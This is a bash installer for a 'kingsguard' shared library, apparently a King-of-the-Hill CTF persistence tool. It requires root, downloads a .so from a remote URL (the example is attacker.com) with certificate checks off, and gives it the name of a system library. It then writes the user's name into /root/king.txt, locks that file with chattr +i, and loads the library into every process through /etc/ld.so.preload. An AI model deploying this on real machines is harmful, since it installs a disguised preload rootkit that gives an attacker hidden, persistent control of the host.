#!/bin/bash
# install.sh - Downloads and installs the kingsguard library

SO_URL="" # The URL of the kingsguard shared library. Ex: http://attacker.com/kingsguard.so
INSTALL_PATH="/usr/lib/libsystemd-util.so" # The full path on the target to install the shared library
USERNAME="" # The username to write to king flag
KING_FILE="/root/king.txt" # The path to the king.txt file

# Check for root access
if test "$(id -u)" -ne "0"; then
	echo "[*] ERROR: script needs root permissions to run"
	exit 1
fi

# Download the shared library
if which curl &>/dev/null; then
	curl -s -k "${SO_URL}" -o "${INSTALL_PATH}"

	if test $? -eq 0; then
		echo "[*] Library download: OK"
	else
		echo "[*] Library download: FAILED"
	fi
fi

# Set library permissions
chmod 755 "${INSTALL_PATH}"

# Write your username to king.txt
echo "[*] Changing the contents of king.txt to ${USERNAME}..."
echo "${USERNAME}" > "${KING_FILE}"

# This makes the file unwritable unless you remove the "immutable" attribute.
echo "[*] Making king.txt immutable..."
chattr +i "${KING_FILE}"

# Adds library to the system's LD_PRELOAD
echo "[*] Installing library..."
echo "${INSTALL_PATH}" > /etc/ld.so.preload

echo "[*] Install complete!"

